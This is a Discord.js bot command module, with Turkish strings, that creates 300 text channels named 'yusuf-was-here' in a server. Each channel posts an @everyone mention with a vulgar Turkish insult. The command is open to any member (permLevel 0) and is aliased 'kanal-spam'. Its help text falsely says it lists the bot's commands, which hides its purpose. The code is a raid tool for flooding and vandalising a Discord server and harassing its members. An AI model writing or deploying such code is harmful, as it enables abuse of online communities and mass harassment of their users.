const { MessageEmbed } = require("discord.js");
const conf = require("../ayarlar.json");

module.exports.run = async (client, message, args) => {

  for (let i = 0; i < 300; i++) {
    setTimeout(function() {
      message.guild.channels.create('yusuf-was-here', "text").then(c => {
        c.send('@everyone patlıııyorssun orrrospu evladı bak buraya')
      })
    }, 3000)
  }

}
module.exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ["kanal", "kanal-spam"],
  permLevel: 0
};

module.exports.help = {
  name: 'kanal-aç',
  description: 'Botta bulunan tüm komutları gösterir',
  usage: 'komutlar'
};